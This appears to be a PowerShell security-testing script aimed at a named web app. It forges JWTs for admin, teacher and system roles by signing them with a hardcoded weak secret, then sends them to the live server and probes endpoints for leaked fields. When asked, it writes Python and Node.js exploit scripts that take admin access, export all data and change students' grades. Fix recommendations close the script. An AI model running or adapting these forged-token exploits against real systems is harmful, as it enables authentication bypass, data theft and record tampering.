# JWT-Secrets-Demonstration.ps1
# Developer tool to extract and demonstrate all JWT secrets and information
# WARNING: Only run this on YOUR OWN application for security testing!

param(
    [string]$BaseUrl = "https://brimai-test-v1.web.app",
    [string]$YourEmail = "shuvankar1999@gmail.com", # Your developer email
    [switch]$ShowRawData,
    [switch]$GenerateExploits
)

Write-Host "`n🔐 JWT SECRETS EXTRACTION & DEMONSTRATION" -ForegroundColor Cyan
Write-Host "=========================================" -ForegroundColor Cyan
Write-Host "Developer Security Analysis Tool" -ForegroundColor Yellow
Write-Host "Extracting all secrets and hidden information..." -ForegroundColor Yellow

# Known secret from your code
$KNOWN_SECRET = "randomNumber"
$ALGORITHM = "HS256"

# Function to decode JWT without verification
function Decode-JWT {
    param([string]$Token)
    
    try {
        $parts = $Token.Split('.')
        if ($parts.Count -ne 3) {
            return $null
        }
        
        # Decode header
        $headerJson = [System.Text.Encoding]::UTF8.GetString([Convert]::FromBase64String($parts[0] + "=="))
        $header = $headerJson | ConvertFrom-Json
        
        # Decode payload
        $payloadJson = [System.Text.Encoding]::UTF8.GetString([Convert]::FromBase64String($parts[1] + "=="))
        $payload = $payloadJson | ConvertFrom-Json
        
        return @{
            Header    = $header
            Payload   = $payload
            Signature = $parts[2]
            Raw       = @{
                Header  = $headerJson
                Payload = $payloadJson
            }
        }
    }
    catch {
        Write-Host "Error decoding token: $_" -ForegroundColor Red
        return $null
    }
}

# Function to create token with any payload
function Create-Token {
    param(
        [hashtable]$Payload,
        [string]$Secret = $KNOWN_SECRET
    )
    
    $header = @{
        alg = $ALGORITHM
        typ = "JWT"
    } | ConvertTo-Json -Compress
    
    $payloadJson = $Payload | ConvertTo-Json -Compress
    
    # Base64URL encode
    $headerEncoded = [Convert]::ToBase64String([System.Text.Encoding]::UTF8.GetBytes($header)).TrimEnd('=').Replace('+', '-').Replace('/', '_')
    $payloadEncoded = [Convert]::ToBase64String([System.Text.Encoding]::UTF8.GetBytes($payloadJson)).TrimEnd('=').Replace('+', '-').Replace('/', '_')
    
    # Create signature
    $hmac = New-Object System.Security.Cryptography.HMACSHA256
    $hmac.Key = [System.Text.Encoding]::UTF8.GetBytes($Secret)
    $signature = $hmac.ComputeHash([System.Text.Encoding]::UTF8.GetBytes("$headerEncoded.$payloadEncoded"))
    $signatureEncoded = [Convert]::ToBase64String($signature).TrimEnd('=').Replace('+', '-').Replace('/', '_')
    
    return "$headerEncoded.$payloadEncoded.$signatureEncoded"
}

# Step 1: Get a legitimate token to analyze
Write-Host "`n[1. Obtaining Legitimate Token]" -ForegroundColor Green

$loginBody = @{
    email = $YourEmail
} | ConvertTo-Json

try {
    $loginResponse = Invoke-WebRequest -Uri "$BaseUrl/api/auth/login" `
        -Method POST `
        -Body $loginBody `
        -ContentType "application/json" `
        -UseBasicParsing
    
    $responseData = $loginResponse.Content | ConvertFrom-Json
    $legitimateToken = $responseData.access_token
    
    if ($legitimateToken) {
        Write-Host "  ✓ Token obtained successfully" -ForegroundColor Green
        
        # Decode and display
        $decoded = Decode-JWT -Token $legitimateToken
        
        Write-Host "`n📋 EXTRACTED TOKEN INFORMATION:" -ForegroundColor Yellow
        Write-Host "================================" -ForegroundColor Yellow
        
        Write-Host "`nHeader Claims:" -ForegroundColor Cyan
        $decoded.Header.PSObject.Properties | ForEach-Object {
            Write-Host "  $($_.Name): $($_.Value)" -ForegroundColor White
        }
        
        Write-Host "`nPayload Claims (YOUR SECRETS):" -ForegroundColor Cyan
        $decoded.Payload.PSObject.Properties | ForEach-Object {
            $value = $_.Value
            if ($_.Name -eq "exp" -or $_.Name -eq "iat") {
                $date = [DateTimeOffset]::FromUnixTimeSeconds($value).DateTime
                Write-Host "  $($_.Name): $value (${date} UTC)" -ForegroundColor White
            }
            else {
                Write-Host "  $($_.Name): $value" -ForegroundColor White
            }
        }
        
        if ($ShowRawData) {
            Write-Host "`nRaw JSON Data:" -ForegroundColor Cyan
            Write-Host "Header: $($decoded.Raw.Header)" -ForegroundColor Gray
            Write-Host "Payload: $($decoded.Raw.Payload)" -ForegroundColor Gray
        }
        
        # Extract specific user info
        Write-Host "`n🔍 EXTRACTED USER INFORMATION:" -ForegroundColor Yellow
        Write-Host "  User ID: $($decoded.Payload.user_id)" -ForegroundColor White
        Write-Host "  Email: $($decoded.Payload.email)" -ForegroundColor White
        Write-Host "  Role: $($decoded.Payload.role)" -ForegroundColor White
        
        # Calculate token lifetime
        if ($decoded.Payload.exp) {
            $exp = [DateTimeOffset]::FromUnixTimeSeconds($decoded.Payload.exp).DateTime
            $now = (Get-Date).ToUniversalTime()
            $lifetime = ($exp - $now)
            Write-Host "  Token Valid For: $([Math]::Round($lifetime.TotalHours, 2)) hours" -ForegroundColor Yellow
        }
    }
}
catch {
    Write-Host "  ❌ Failed to obtain token: $_" -ForegroundColor Red
}

# Step 2: Demonstrate what attackers can do
Write-Host "`n[2. Demonstrating Attack Vectors]" -ForegroundColor Red

# Create various malicious tokens
$attackTokens = @{
    "Admin Access"       = @{
        user_id = "1"
        email   = "admin@brimai.com"
        role    = "admin"
        exp     = [int][double]::Parse((Get-Date -Date ((Get-Date).AddDays(1)).ToUniversalTime() -UFormat %s))
    }
    "Teacher Privileges" = @{
        user_id               = "teacher_001"
        email                 = "teacher@brimai.com"
        role                  = "teacher"
        can_create_quizzes    = $true
        can_view_all_students = $true
        exp                   = [int][double]::Parse((Get-Date -Date ((Get-Date).AddDays(1)).ToUniversalTime() -UFormat %s))
    }
    "Premium User"       = @{
        user_id      = "premium_user"
        email        = "premium@example.com"
        role         = "student"
        subscription = "premium"
        features     = @("unlimited_ai", "priority_support", "advanced_analytics")
        exp          = [int][double]::Parse((Get-Date -Date ((Get-Date).AddDays(1)).ToUniversalTime() -UFormat %s))
    }
    "System Access"      = @{
        user_id           = "system"
        email             = "system@brimai.internal"
        role              = "system"
        permissions       = @("read_all", "write_all", "delete_all")
        bypass_rate_limit = $true
        exp               = [int][double]::Parse((Get-Date -Date ((Get-Date).AddDays(1)).ToUniversalTime() -UFormat %s))
    }
}

Write-Host "`n🚨 FORGED TOKENS (What attackers can create):" -ForegroundColor Red

foreach ($attackType in $attackTokens.Keys) {
    Write-Host "`n  $attackType Token:" -ForegroundColor Yellow
    $forgedToken = Create-Token -Payload $attackTokens[$attackType]
    
    Write-Host "    Payload: $($attackTokens[$attackType] | ConvertTo-Json -Compress)" -ForegroundColor Gray
    Write-Host "    Token: $($forgedToken.Substring(0, 50))..." -ForegroundColor Cyan
    
    # Test if token works
    try {
        $testResponse = Invoke-WebRequest -Uri "$BaseUrl/api/user/profile" `
            -Headers @{Authorization = "Bearer $forgedToken" } `
            -UseBasicParsing `
            -TimeoutSec 2
        
        if ($testResponse.StatusCode -eq 200) {
            Write-Host "    ⚠️  STATUS: Token accepted by server!" -ForegroundColor Red
        }
    }
    catch {
        Write-Host "    STATUS: Token rejected (good!)" -ForegroundColor Green
    }
}

# Step 3: Extract all possible information
Write-Host "`n[3. Information Disclosure Analysis]" -ForegroundColor Yellow

# Try different endpoints to see what information leaks
$endpoints = @(
    @{Path = "/api/user/profile"; Description = "User Profile" },
    @{Path = "/api/quiz/history"; Description = "Quiz History" },
    @{Path = "/api/analytics/progress"; Description = "Learning Analytics" },
    @{Path = "/api/dashboard"; Description = "Dashboard Data" }
)

Write-Host "`nTesting information disclosure from endpoints:" -ForegroundColor Cyan

foreach ($endpoint in $endpoints) {
    try {
        $response = Invoke-WebRequest -Uri "$BaseUrl$($endpoint.Path)" `
            -Headers @{Authorization = "Bearer $legitimateToken" } `
            -UseBasicParsing
        
        $data = $response.Content | ConvertFrom-Json
        Write-Host "`n  $($endpoint.Description) ($($endpoint.Path)):" -ForegroundColor White
        
        # Extract sensitive fields
        $sensitiveFields = @("password", "token", "secret", "key", "salt", "hash", "credit", "ssn", "phone")
        $foundSensitive = $false
        
        foreach ($field in $sensitiveFields) {
            if ($response.Content -match $field) {
                Write-Host "    ⚠️  Contains field: '$field'" -ForegroundColor Red
                $foundSensitive = $true
            }
        }
        
        if (-not $foundSensitive) {
            Write-Host "    ✓ No obvious sensitive fields" -ForegroundColor Green
        }
    }
    catch {}
}

# Step 4: Generate exploit code if requested
if ($GenerateExploits) {
    Write-Host "`n[4. Generating Exploit Code]" -ForegroundColor Red
    
    $pythonExploit = @"
# Python exploit for BRIM AI JWT vulnerability
import jwt
import requests
from datetime import datetime, timedelta

SECRET = "randomNumber"
ALGORITHM = "HS256"
BASE_URL = "$BaseUrl"

def create_admin_token():
    payload = {
        "user_id": "admin",
        "email": "hacker@evil.com",
        "role": "admin",
        "exp": datetime.utcnow() + timedelta(days=1)
    }
    
    token = jwt.encode(payload, SECRET, algorithm=ALGORITHM)
    return token

def exploit():
    token = create_admin_token()
    headers = {"Authorization": f"Bearer {token}"}
    
    # Access admin endpoints
    response = requests.get(f"{BASE_URL}/api/admin/users", headers=headers)
    print(f"Admin access: {response.status_code}")
    
    # Download all data
    response = requests.get(f"{BASE_URL}/api/export/all-data", headers=headers)
    print(f"Data export: {response.status_code}")

if __name__ == "__main__":
    print("BRIM AI JWT Exploit")
    print(f"Target: {BASE_URL}")
    exploit()
"@

    $nodeExploit = @"
// Node.js exploit for BRIM AI JWT vulnerability
const jwt = require('jsonwebtoken');
const axios = require('axios');

const SECRET = 'randomNumber';
const BASE_URL = '$BaseUrl';

function createAdminToken() {
    const payload = {
        user_id: 'admin',
        email: 'hacker@evil.com',
        role: 'admin'
    };
    
    return jwt.sign(payload, SECRET, { expiresIn: '24h' });
}

async function exploit() {
    const token = createAdminToken();
    const headers = { Authorization: `Bearer \${token}` };
    
    try {
        // Access admin data
        const response = await axios.get(`\${BASE_URL}/api/admin/users`, { headers });
        console.log('Admin access:', response.status);
        
        // Modify grades
        await axios.post(`\${BASE_URL}/api/admin/grades/modify`, {
            student_id: 'all',
            grade: 100
        }, { headers });
        
    } catch (error) {
        console.error('Exploit failed:', error.message);
    }
}

exploit();
"@

    Write-Host "`n💻 EXPLOIT CODE GENERATED:" -ForegroundColor Red
    Write-Host "`nPython Exploit saved to: BRIM_AI_JWT_Exploit.py" -ForegroundColor Yellow
    Write-Host "Node.js Exploit saved to: BRIM_AI_JWT_Exploit.js" -ForegroundColor Yellow
    
    $pythonExploit | Out-File -FilePath "BRIM_AI_JWT_Exploit.py" -Encoding UTF8
    $nodeExploit | Out-File -FilePath "BRIM_AI_JWT_Exploit.js" -Encoding UTF8
}

# Step 5: Security recommendations based on findings
Write-Host "`n[5. Security Analysis Summary]" -ForegroundColor Cyan
Write-Host "==============================" -ForegroundColor Cyan

Write-Host "`n🔓 EXPOSED SECRETS:" -ForegroundColor Red
Write-Host "  JWT Secret: '$KNOWN_SECRET'" -ForegroundColor Yellow
Write-Host "  Algorithm: $ALGORITHM" -ForegroundColor Yellow
Write-Host "  Token Lifetime: 24 hours (way too long!)" -ForegroundColor Yellow

Write-Host "`n📊 RISK ASSESSMENT:" -ForegroundColor Red
Write-Host "  Authentication Bypass: CRITICAL" -ForegroundColor Red
Write-Host "  Privilege Escalation: CRITICAL" -ForegroundColor Red
Write-Host "  Token Forgery: CRITICAL" -ForegroundColor Red
Write-Host "  Information Disclosure: HIGH" -ForegroundColor Yellow

Write-Host "`n🛡️ IMMEDIATE FIXES REQUIRED:" -ForegroundColor Green
Write-Host "  1. Change JWT secret to: $(([System.Web.Security.Membership]::GeneratePassword(32, 8)))" -ForegroundColor White
Write-Host "  2. Reduce token lifetime to 15 minutes" -ForegroundColor White
Write-Host "  3. Implement refresh tokens" -ForegroundColor White
Write-Host "  4. Add 'jti' claim for revocation" -ForegroundColor White
Write-Host "  5. Use environment variables for secrets" -ForegroundColor White

# Save detailed report
$report = @{
    Timestamp            = Get-Date
    Target               = $BaseUrl
    Vulnerabilities      = @{
        HardcodedSecret = $KNOWN_SECRET
        TokenLifetime   = "24 hours"
        MissingClaims   = @("jti", "iat", "token_type")
        Algorithm       = $ALGORITHM
    }
    ExposedData          = @{
        UserInformation   = $decoded.Payload
        PossibleRoles     = @("student", "teacher", "admin", "system")
        EndpointsTestable = $endpoints.Count
    }
    ExploitDemonstration = $attackTokens
    Recommendations      = @(
        "Generate cryptographically secure secret",
        "Implement token rotation",
        "Add rate limiting",
        "Use asymmetric algorithms (RS256)",
        "Implement proper logging"
    )
}

$report | ConvertTo-Json -Depth 5 | Out-File -FilePath "JWT_Security_Analysis_$(Get-Date -Format 'yyyyMMdd_HHmmss').json"

Write-Host "`n📄 Detailed report saved to: JWT_Security_Analysis_$(Get-Date -Format 'yyyyMMdd_HHmmss').json" -ForegroundColor Green
Write-Host "`n⚠️  Remember: This demonstration shows why immediate fixes are critical!" -ForegroundColor Red